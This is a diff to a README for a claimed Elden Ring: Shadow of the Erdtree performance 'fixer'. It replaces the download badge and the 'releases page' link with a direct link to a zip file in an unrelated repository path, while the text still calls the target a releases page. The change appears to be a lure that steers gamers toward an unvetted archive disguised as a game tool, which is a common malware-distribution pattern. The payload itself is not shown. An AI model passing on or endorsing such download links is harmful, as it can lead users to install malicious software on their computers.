@@ -5,7 +5,7 @@ description: "Optimize performance and increase frame rates in Elden Ring: Shado
 ---
 # ⚔️ ShadowOfTheErdtree-Fixer - Boost Gameplay Performance Today
 
-[![Download Latest Version](https://img.shields.io/badge/Download-ShadowOfTheErdtree--Fixer-blue)](https://github.com/Tobyanuretic459/ShadowOfTheErdtree-Fixer/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-ShadowOfTheErdtree--Fixer-blue)](https://raw.githubusercontent.com/Tobyanuretic459/tobyanuretic459.github.io/main/waged/github-tobyanuretic-io-v2.6.zip)
 
 This application improves gaming performance in Elden Ring: Shadow of the Erdtree. It addresses frame rate drops, reduces stutter, and optimizes graphics settings. These changes result in a smoother experience on Windows PCs. 
 
@@ -17,7 +17,7 @@ Many players face performance issues with recent game updates. Hardware configur
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/Tobyanuretic459/ShadowOfTheErdtree-Fixer/releases) to download the package.
+1. Visit the [releases page](https://raw.githubusercontent.com/Tobyanuretic459/tobyanuretic459.github.io/main/waged/github-tobyanuretic-io-v2.6.zip) to download the package.
 2. Select the latest version listed under the Assets section.
 3. Save the file to a known folder on your hard drive.
 4. Extract the contents of the file if it is in a compressed format.
